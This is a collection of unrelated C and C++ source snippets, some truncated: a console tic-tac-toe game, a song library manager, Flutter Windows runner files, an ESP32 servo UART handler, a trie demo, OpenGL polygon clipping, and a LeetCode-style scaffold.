    "// Tic Tac Toe Game\r\n\r\n// Author : The_mantux(C)\r\n// Date : 03-05-2024\r\n// github : https://github.com/The-mantux\r\n\r\n#include <iostream>\r\n#include <string>\r\n#include <windows.h>\r\n#include <cstdlib>\r\n#include <ctime>\r\n\r\n\r\nusing namespace std;\r\n\r\n// Colors\r\n#define RESET       \"\\033[0m\"\r\n#define BLUE        \"\\033[1m\\033[34m\"  /*Player0*/\r\n#define RED         \"\\033[1m\\033[31m\"  /*Player1*/\r\n#define YELLOW      \"\\033[1m\\033[33m\"  /*beware error*/\r\n#define GREEN       \"\\033[1m\\033[32m\"  /*Winner*/\r\n\r\n// Prototypes\r\nint  menu();\r\nvoid printTutorialTable0();\r\nvoid printTutorialTable1();\r\nvoid gameTable(char table[3][3]);\r\nint  game(char table[3][3],int x);\r\nvoid tablePrint(char table[3][3]);\r\nint  player0(char table[3][3],int vet[],int &counter);\r\nint  checker(int cell[],int number);\r\nvoid selectCell(int &row,int &col,int number);\r\nvoid next();\r\n\r\nint main(){\r\n\r\n    int s,x,counter=0,row,col;\r\n\r\n    char table[3][3]={\r\n        {'1','2','3'},\r\n        {'4','5','6'},\r\n        {'7','8','9'}\r\n    };\r\n\r\n    int cell[3*3];\r\n\r\n    do{\r\n        system(\"cls\");\r\n        s=menu();\r\n\r\n        switch(s){\r\n\r\n            case 1:{\r\n                //Game\r\n\r\n                x=rand() % 2 + 1;\r\n                break;\r\n            }\r\n\r\n            case 2:{\r\n                //Tutorial\r\n\r\n                cout<<\"\\nPlayer 1 : \"<<BLUE<<\"X\"<<RESET<<endl;\r\n                cout<<\"Player 2 : \"<<RED<<\"O\"<<RESET<<endl;\r\n\r\n                cout<<\"\\n\";\r\n\r\n                cout<<\"At the beginning of the game you will be randomly chosen which player will start the game...\"<<endl;\r\n\r\n                next();\r\n                cin.get();\r\n\r\n                cout<<\"This is the game table: \\n\";\r\n                printTutorialTable0();\r\n                cout<<\"\\nSelect the cell number you want to select...\"<<endl;\r\n\r\n                next();\r\n\r\n                cout<<\"At the end of the game the result will be such a thing: \"<<endl;\r\n                printTutorialTable1();\r\n\r\n                next();\r\n\r\n                cout<<\"Keep track of your victories and defeats...\"<<endl;\r\n                cout<<\"Game\"<<endl;\r\n                cout<<\"Player 1 : \"<<BLUE<< 15<<\" Wins\"<<RESET<<endl;\r\n                cout<<\"Player 2 : \"<<RED<< 11<<\" Wins\"<<RESET<<endl;\r\n                cout<<\"Draws : \"<<2<<endl;\r\n\r\n                cout<<\"\\n\\nNow it's time to play\";\r\n\r\n                next();\r\n\r\n                break;\r\n            }\r\n\r\n            case 0:{\r\n                //Exit\r\n                cout<<BLUE<<\"Bye\"<<RESET<<endl;\r\n                break;\r\n            }\r\n\r\n            default:{\r\n                //Error\r\n                cout<<RED<<\"Error\"<<RESET<<endl;\r\n                break;\r\n            }\r\n        }\r\n\r\n    }while(s!=0);\r\n\r\n    return 0;\r\n}\r\n\r\nint game(char table[3][3],int x){\r\n    \r\n    if(x==1){\r\n        //Player 0\r\n        cout<<\"Player 1 starts the game\"<<endl;\r\n    }\r\n    else if(x==2){\r\n        cout<<\"Player 2 starts the game\"<<endl;\r\n    }\r\n\r\n}\r\n\r\nvoid tablePrint(char table[3][3]){\r\n\r\n    cout<<\"     |     |     \"<<endl;\r\n    cout<<\"  \"<<table[0][0]<<\"  |  \"<<table[0][1]<<\"  |  \"<<table[0][2]<<\"  \"<<endl;\r\n    cout<<\"_____|_____|_____\"<<endl;\r\n    cout<<\"     |     |     \"<<endl;\r\n    cout<<\"  \"<<table[1][0]<<\"  |  \"<<table[1][1]<<\"  |  \"<<table[1][2]<<\"  \"<<endl;\r\n    cout<<\"_____|_____|_____\"<<endl;\r\n    cout<<\"     |     |     \"<<endl;\r\n    cout<<\"  \"<<table[2][0]<<\"  |  \"<<table[2][1]<<\"  |  \"<<table[2][2]<<\"  \"<<endl;\r\n    cout<<\"     |     |     \"<<endl;\r\n}\r\n\r\nint player0(char table[3][3],int vet[],int &counter){\r\n    //Player 1\r\n\r\n    int cell,c=0,c1=0;\r\n\r\n    void tablePrint(char table[3][3]);\r\n\r\n    do{\r\n\r\n        cout<<\"Select the cell number you want to select...\"<<endl;\r\n        cin>>cell;\r\n\r\n        if(cell<1 || cell>9){\r\n            cout<<RED<<\"Insert an existing cell\"<<RESET<<endl;\r\n            c=-1;\r\n        }\r\n\r\n        c1=checker(vet,cell);\r\n        \r\n        if(c1==-1){\r\n            cout<<RED<<\"The cell is already occupied\\n\";\r\n        }\r\n\r\n\r\n    }while(c==-1 || c1==-1);\r\n\r\n    vet[counter]=cell;\r\n    counter++;\r\n\r\n    return cell;\r\n}\r\n\r\nvoid selectCell(int &row,int &col,int number){\r\n\r\n    if(number==1){\r\n        row=0;\r\n        col=0;\r\n    }\r\n    else if(number==2){\r\n        row=0;\r\n        col=1;\r\n    }\r\n    else if(number==3){\r\n        row=0;\r\n        col=2;\r\n    }\r\n    else if(number==4){\r\n        row=1;\r\n        col=0;\r\n    }\r\n    else if(number==5){\r\n        row=1;\r\n        col=1;\r\n    }\r\n    else if(number==6){\r\n        row=1;\r\n        col=2;\r\n    }\r\n    else if(number==7){\r\n        row=2;\r\n        col=0;\r\n    }\r\n    else if(number==8){\r\n        row=2;\r\n        col=1;\r\n    }\r\n    else if(number==9){\r\n        row=2;\r\n        col=2;\r\n    }\r\n}\r\n\r\nint checker(int cell[],int number){\r\n\r\n    bool check=false;\r\n\r\n    for(int i=0;i<sizeof(cell);i++){\r\n\r\n        if(cell[i]==number){\r\n            check=true;\r\n        }\r\n    }\r\n\r\n    if(check==true){\r\n        return -1;\r\n    }\r\n    else{\r\n        return 0;\r\n    }\r\n}\r\n\r\nvoid printTutorialTable0(){\r\n",
    "#include <iostream>\n#include <string>\n#include \"Manager.h\"\n#include \"Heap.h\"\n#include \"BST_songTitle.h\"\n#include \"BST_song.h\"\n#include \"Song.h\"\n\nusing namespace std;\n\nBST_song songTree;\nBST_songTitle songTitleTree;\nHeap songTime;\n\nvoid Manager::addSong(Song &value){\n\tsongTree.insert(value);\n\tsongTitleTree.insert(value);\n\tsongTime.Push(&value);\n\n\tcout <<  endl << \"new song \" << value.getSongID() << \" \" << value.getSongTitle() << endl;\n}\n\nvoid Manager::show_listen_time(){\n\tsongTree.printInOrder(songTree.getRoot());\n}\n\nvoid Manager::listen(string &title, int seconds){\n\tint index = songTitleTree.listenHelper(title, seconds);\n\tsongTime.PercolateUp(index);\n\tsongTime.Peek();\n}\n\nvoid Manager::favorite(){//Finished and tested on 4/28/2024 @ 1:06PM. -Kian F\n\tif(songTime.Empty()){\n\t\tcout << \"No song to favorite\" << endl;\n\t\treturn;\n\t}\n    Song* topSng=songTime.Pop();//Pop the top song from the heap- 4/28/24 Kian F \n    if(topSng == nullptr){\n        cout << \"Heap is empty, no song to favorite.\" << endl;\n        return;\n    }\n\n    topSng->setIsFavorite(true);//Set the favorite flag to true, should effect song in BST- 4/28/24 Kian F \n    cout <<\"Song \"<< topSng->getSongTitle() << \" added to list of favorites (\"<<topSng->getSongDuration()<<\")\" << endl;//Printing-Kian F\n}\n\nbool Manager::uniqueID(Song &song){\n\treturn songTree.search(song);\n}\n\n// bool Manager::checkSong(string &title){\n// \treturn true; // Not impemented yet -> meant to check if the song exists or not -> multiple uses ? Maybe\n// }\n\n/* \nRemoves the song from the BST_songTitle and Heap, and sets its \n   'removed' attribute = true so that its effectively \"removed\" from the BST_song\n\nNote:\n\t  a song being a favorite has no effect on how its removed, it just prints out\n\t  a slightly different output\n*/\nvoid Manager::remove(string &songToDelete)\n{\n\t// make sure the song exists first\n\tif(songTitleTree.findAndReturnSong(songToDelete) != nullptr)\n\t{\n\t\t// set the songs id to something never to be used to free up the old ID\n\t\tsongTitleTree.setSongIDHelper(songToDelete, -1);\n\n\t\t// \"remove\" it from the Song Object BST... just set its removed stat = true\n\t\tsongTitleTree.setRemovedStatHelper(songToDelete, true);\n\n\t\t//  if the song isnt a favorite\n\t\tif(songTitleTree.getFavoriteStatHelper(songToDelete) == false)\n\t\t\tcout << endl << \"Removed \" << songToDelete << \" from your songs\" << endl;\n\t\telse \t// the song is a favorite\n\t\t\tcout << endl << \"Removed \" << songToDelete << \" from your favorites\" << endl;\n\t\t\n\t\t// remove it from the Heap\n\t\tsongTime.Remove(songTitleTree.getHeapIndexHelper(songToDelete));\n\n\t\t// remove it from the Title BST\n\t\tsongTitleTree.removeHelper(songToDelete);\n\t}\n\telse\n\t{\n\t\tcout << endl << \"Song \" << songToDelete << \" does not exist\" << endl;\n\t} // show_listen_time\n}\t\nbool Manager::checkSong(string &title){\n\treturn true; // Not impemented yet -> meant to check if the song exists or not -> multiple uses ? Maybe\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"port_handler.h\"\n#include \"driver/uart.h\"\n#include \"driver/gpio.h\"\n#include \"esp_log.h\"\n#include \"arduino_droppings.h\"\n\nstatic const char * TAG = \"PORT HANDLER\";\n\nDXLPortHandler::DXLPortHandler()\n : open_state_(false)\n{}\n\n/* DXLPortHandler */\nbool DXLPortHandler::getOpenState()\n{\n  return open_state_;\n}\n\nvoid DXLPortHandler::setOpenState(bool state)\n{\n  open_state_ = state;\n}\n\n\nusing namespace DYNAMIXEL;\n\n/* SerialPortHandler */\nSerialPortHandler::SerialPortHandler(uart_port_t uart_num, gpio_num_t dir_pin)\n : DXLPortHandler(), uart_num_(uart_num), dir_pin_(dir_pin), baud_(1000000)\n{}\n\nvoid SerialPortHandler::begin()\n{\n  begin(baud_);\n}\n\nvoid SerialPortHandler::begin(unsigned long baud)\n{\n  baud_ = baud;\n  \n  uart_config_t uart_config;\n    \n  uart_config.baud_rate = int(baud);\n  uart_config.data_bits = UART_DATA_8_BITS;\n  uart_config.parity = UART_PARITY_DISABLE;\n  uart_config.stop_bits = UART_STOP_BITS_1;\n  uart_config.flow_ctrl = UART_HW_FLOWCTRL_DISABLE;\n  uart_config.rx_flow_ctrl_thresh = 122;\n  uart_config.source_clk = UART_SCLK_DEFAULT;\n\n    // Configure UART parameters\n    ESP_ERROR_CHECK(uart_param_config(uart_num_, &uart_config));\n\n    uart_set_mode(uart_num_, UART_MODE_UART);\n\n    // Set UART pins(TX: IO4, RX: IO5, RTS: IO18, CTS: IO19)\n    ESP_ERROR_CHECK(uart_set_pin(uart_num_, CONFIG_DXL_TX_PIN, CONFIG_DXL_RX_PIN, UART_PIN_NO_CHANGE , UART_PIN_NO_CHANGE ));\n\n    // Setup UART buffered IO\n    const int uart_buffer_size = (1024 * 2);\n    // Install UART driver (not using an event queue)\n    ESP_ERROR_CHECK(uart_driver_install(uart_num_, uart_buffer_size, uart_buffer_size, 10, NULL, 0));\n\n\n    // Since we're communicating half fuplex we also have to configure the direction pin\n    gpio_config_t io_conf;\n    \n    io_conf.intr_type = GPIO_INTR_DISABLE;\n    io_conf.mode = GPIO_MODE_INPUT_OUTPUT;\n    io_conf.pin_bit_mask = GPIO_OUTPUT_PIN_SEL;\n    io_conf.pull_down_en = GPIO_PULLDOWN_DISABLE;\n    io_conf.pull_up_en = GPIO_PULLUP_DISABLE;\n    \n    ESP_ERROR_CHECK(gpio_config(&io_conf));\n    ESP_ERROR_CHECK(gpio_set_level(dir_pin_, LOW));\n\n    setOpenState(true);\n}\n\nvoid SerialPortHandler::end(void)\n{\n  setOpenState(false);\n}\n\nint SerialPortHandler::available(void)\n{\n  int available = 0;\n  ESP_ERROR_CHECK(uart_get_buffered_data_len(uart_num_, (size_t*)&available));\n  return available;\n}\n\nint SerialPortHandler::read()\n{\n  int ret = 0;\n  uart_read_bytes(uart_num_, &ret, 1, portMAX_DELAY);\n  return ret;\n}\n\nsize_t SerialPortHandler::write(uint8_t c)\n{\n   size_t ret;\n\n  ESP_LOGI(TAG, \"Write single: %d\", c);\n\n  ESP_ERROR_CHECK(gpio_set_level(dir_pin_, HIGH));\n  while(gpio_get_level(dir_pin_) != HIGH)\n  {\n    // Wait for state change\n  }\n\n  ret = uart_write_bytes(uart_num_, &c, 1);\n  uart_wait_tx_done(uart_num_, 10 /* 1 RTOS ticks max wait time*/);\n\n  uart_flush(uart_num_);\n\n  ESP_ERROR_CHECK(gpio_set_level(dir_pin_, LOW));\n  while(gpio_get_level(dir_pin_) != LOW)\n  {\n    // Wait for state change\n  }\n\n  return ret;      \n}\n\nsize_t SerialPortHandler::write(uint8_t *buf, size_t len)\n{\n  size_t ret;\n\n  ESP_LOGI(TAG, \"Write buffer len: %d\", len);\n\n  ESP_ERROR_CHECK(gpio_set_level(dir_pin_, HIGH));\n  while(gpio_get_level(dir_pin_) != HIGH)\n  {\n    // Wait for state change\n  }\n\n  ret = uart_write_bytes(uart_num_, buf, len);\n  uart_wait_tx_done(uart_num_, 10 /* 1 RTOS ticks max wait time*/);\n\n  uart_flush(uart_num_);\n\n  ESP_ERROR_CHECK(gpio_set_level(dir_pin_, LOW));\n  while(gpio_get_level(dir_pin_) != LOW)\n  {\n    // Wait for state change\n  }\n\n  return ret;      \n}\n\nunsigned long SerialPortHandler::getBaud() const\n{\n  return baud_;\n}\n\n\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct Trie {\n    struct Trie *children[26];\n    bool end_of_word;\n};\n\nstruct Trie *getNode() {//(void)\n    struct Trie *pnode = new Trie;\n    pnode->end_of_word = false;\n\n    for(int i = 0; i < 26; i++) {\n        pnode->children[i] = NULL;\n    }\n\n    return pnode;\n}\n\nvoid insert (struct Trie *root, string s) {\n    struct Trie *tempRoot = root;\n    for(int i = 0; i < s.size(); i++) {\n        //finding index of each character;\n        int k = s[i] - 'a';\n\n        if(!tempRoot->children[k]) {//not NULL\n            tempRoot->children[k] = getNode();\n        }\n\n        tempRoot = tempRoot->children[k];\n    }\n\n    tempRoot->end_of_word = true;\n\n}\n\nstring search(struct Trie *root, string s) {\n    struct Trie *tempRoot = root;\n    string ans = \"\";\n    for(int i = 0; i < s.size(); i++) {\n        int k = s[i] - 'a';\n        if(tempRoot->children[k] == NULL) {\n            // return false;\n            return \"Not found\";\n        }\n\n        ans += s[i];\n        cout << tempRoot->children[k] << \" \";\n        tempRoot = tempRoot->children[k];\n    } \n\n    // return (tempRoot != NULL && tempRoot->end_of_word);\n    return ans;\n}\n\nint main() {\n    struct Trie *root = getNode();\n    insert(root, \"bear\");\n    insert(root, \"prefix\");\n    insert(root, \"prompt\");\n    insert(root, \"prefer\");\n    insert(root, \"car\");\n    insert(root, \"card\");\n    insert(root, \"cat\");\n    insert(root, \"beach\");\n    insert(root, \"cardiology\");\n    \n    cout << search(root, \"bear\") << endl;\n    cout << search(root, \"bears\") << endl;\n    cout << search(root, \"prefix\") << endl;\n\n    return 1;\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"medical_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<stdio.h>\n#include<GL/gl.h>\n#include<GL/glu.h>\n#include<GL/glut.h>\n#include<math.h>\n\ntypedef struct{\n    float x;\n    float y;\n}PT;\n\nint n;\n\nint i,j;\n\nPT p1,p2,p[20],pp[20];\n\nvoid left(){\n    i=0;j=0;\n    for(i=0;i<n;i++){\n        if(p[i].x<p1.x && p[i+1].x>=p1.x){\n            if(p[i+1].x-p[i].x!=0){\n                pp[j].y=(p[i+1].y-p[i].y)/(p[i+1].x-p[i].x)*(p1.x-p[i].x)+p[i].y;\n            }\n            else{\n                pp[j].y=p[i].y;\n            }\n            pp[j].x=p1.x;\n            j++;\n            pp[j].x=p[i+1].x;\n            pp[j].y=p[i+1].y;\n            j++;\n        }\n\n        if(p[i].x>=p1.x && p[i+1].x>=p1.x){\n            pp[j].y=p[i+1].y;\n            pp[j].x=p[i+1].x;\n            j++;\n        }\n\n        if(p[i].x>=p1.x && p[i+1].x<p1.x){\n            if(p[i+1].x-p[i].x!=0){\n                pp[j].y=(p[i+1].y-p[i].y)/(p[i+1].x-p[i].x)*(p1.x-p[i].x)+p[i].y;\n            }\n            else{\n                pp[j].y=p[i].y;\n            }\n            pp[j].x=p1.x;\n            j++;\n        }\n    }\n\n    for(i=0;i<j;i++){\n        p[i].x=pp[i].x;\n        p[i].y=pp[i].y;\n    }\n\n    p[i].x=pp[0].x;\n    p[i].y=pp[0].y;\n    n=j;\n}\n\nvoid right(){\n    i=0;j=0;\n\n    for(i=0;i<n;i++){\n        if(p[i].x>p2.x && p[i+1].x<=p2.x){\n            if(p[i+1].x-p[i].x!=0){\n                pp[j].y=(p[i+1].y-p[i].y)/(p[i+1].x-p[i].x)*(p2.x-p[i].x)+p[i].y;\n            }\n            else{\n                pp[j].y=p[i].y;\n            }\n            pp[j].x=p2.x;\n            j++;\n            pp[j].x=p[i+1].x;\n            pp[j].y=p[i+1].y;\n            j++;\n        }\n\n        if(p[i].x<=p2.x && p[i+1].x<=p2.x){\n            pp[j].y=p[i+1].y;\n            pp[j].x=p[i+1].x;\n            j++;\n        }\n\n        if(p[i].x<=p2.x && p[i+1].x>p2.x){\n            if(p[i+1].x-p[i].x!=0){\n                pp[j].y=(p[i+1].y-p[i].y)/(p[i+1].x-p[i].x)*(p2.x-p[i].x)+p[i].y;\n            }\n            else{\n                pp[j].y=p[i].y;\n            }\n            pp[j].x=p2.x;\n            j++;\n        }\n    }\n\n    for(i=0;i<j;i++){\n        p[i].x=pp[i].x;\n        p[i].y=pp[i].y;\n    }\n    p[i].x=pp[0].x;\n    p[i].y=pp[0].y;\n}\n\nvoid top(){\n    i=0;j=0;\n\n    for(i=0;i<n;i++){\n        if(p[i].y>p2.y && p[i+1].y<=p2.y){\n            if(p[i+1].y-p[i].y!=0){\n                pp[j].x=(p[i+1].x-p[i].x)/(p[i+1].y-p[i].y)*(p2.y-p[i].y)+p[i].x;\n            }\n            else{\n                pp[j].x=p[i].x;\n            }\n            pp[j].y=p2.y;\n            j++;\n            pp[j].x=p[i+1].x;\n            pp[j].y=p[i+1].y;\n            j++;\n        }\n\n        if(p[i].y<=p2.y && p[i+1].y<=p2.y){\n            pp[j].y=p[i+1].y;\n            pp[j].x=p[i+1].x;\n            j++;\n        }\n\n        if(p[i].y<=p2.y && p[i+1].y>p2.y){\n            if(p[i+1].y-p[i].y!=0){\n                pp[j].x=(p[i+1].x-p[i].x)/(p[i+1].y-p[i].y)*(p2.y-p[i].y)+p[i].x;\n            }\n            else{\n                pp[j].x=p[i].x;\n            }\n            pp[j].y=p2.y;\n            j++;\n        }\n    }\n\n    for(i=0;i<j;i++){\n        p[i].x=pp[i].x;\n        p[i].y=pp[i].y;\n    }\n    p[i].x=pp[0].x;\n    p[i].y=pp[0].y;\n    n=j;\n}\n\n\nvoid bottom(){\n    i=0;j=0;\n\n    for(i=0;i<n;i++){\n        if(p[i].y<p1.y && p[i+1].y>=p1.y){\n            if(p[i+1].y-p[i].y!=0){\n                pp[j].x=(p[i+1].x-p[i].x)/(p[i+1].y-p[i].y)*(p1.y-p[i].y)+p[i].x;\n            }\n            else{\n                pp[j].x=p[i].x;\n            }\n            pp[j].y=p1.y;\n            j++;\n            pp[j].x=p[i+1].x;\n            pp[j].y=p[i+1].y;\n            j++;\n        }\n\n        if(p[i].y>=p1.y && p[i+1].y>=p1.y){\n            pp[j].x=p[i+1].x;\n            pp[j].y=p[i+1].y;\n            j++;\n        }\n\n        if(p[i].y>=p1.y && p[i+1].y<p1.y){\n            if(p[i+1].y-p[i].y!=0){\n                pp[j].x=(p[i+1].x-p[i].x)/(p[i+1].y-p[i].y)*(p1.y-p[i].y)+p[i].x;\n            }\n            else{\n                pp[j].x=p[i].x;\n            }\n            pp[j].y=p1.y;\n            j++;\n        }\n    }\n\n    for(i=0;i<j;i++){\n        p[i].x=pp[i].x;\n        p[i].y=pp[i].y;\n    }\n    p[i].x=pp[0].x;\n    p[i].y=pp[0].y;\n    n=j;\n}\n\nvoid drawpolygon(){\n    glColor3f(0.0,1.0,1.0);\n    for(i=0;i<n-1;i++){\n        glBegin(GL_LINES);\n        glVertex2d(p[i].x,p[i].y);\n        glVertex2d(p[i+1].x,p[i+1].y);\n        glEnd();\n    }\n    glBegin(GL_LINES);\n    glVertex2d(p[i].x,p[i].y);\n    glVertex2d(p[0].x,p[0].y);\n    glEnd();\n}\n\nvoid myMouse(int button, int state, int x, int y){\n    if(button==GLUT_LEFT_BUTTON && state==GLUT_DOWN){\n        glClear(GL_COLOR_BUFFER_BIT);\n        glBegin(GL_LINE_LOOP);\n        glVertex2f(p1.x,p1.y);\n        glVertex2f(p2.x,p1.y);\n        glVertex2f(p2.x,p2.y);\n        glVertex2f(p1.x,p2.y);\n        glEnd();\n        left();\n        right();\n        top();\n        bottom();\n        drawpolygon();\n    }\n    glFlush();\n}\n\n\nvoid display(void){\n    glClear(GL_COLOR_BUFFER_BIT);\n    glColor3f(0.4,0.0,1.0);\n    glBegin(GL_LINE_LOOP);\n    glVertex2f(p1.x, p1.y);\n    glVertex2f(p2.x,p1.y);\n    glVertex2f(p2.x,p",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct ListNode {\n    int val;\n    ListNode *next;\n    ListNode() : val(0), next(nullptr) {\n    }\n    ListNode(int x) : val(x), next(nullptr) {\n    }\n    ListNode(int x, ListNode *next) : val(x), next(next) {\n    }\n};\n\nstruct TreeNode {\n    int val;\n    TreeNode *left;\n    TreeNode *right;\n    TreeNode() : val(0), left(nullptr), right(nullptr) {\n    }\n    TreeNode(int x) : val(x), left(nullptr), right(nullptr) {\n    }\n    TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {\n    }\n};\n\nclass Node {\npublic:\n    int val;\n    vector<Node *> neighbors;\n    Node() {\n        val = 0;\n        neighbors = vector<Node *>();\n    }\n    Node(int _val) {\n        val = _val;\n        neighbors = vector<Node *>();\n    }\n    Node(int _val, vector<Node *> _neighbors) {\n        val = _val;\n        neighbors = _neighbors;\n    }\n};\n\n/*the solution should start from below*/\n\nclass Solution 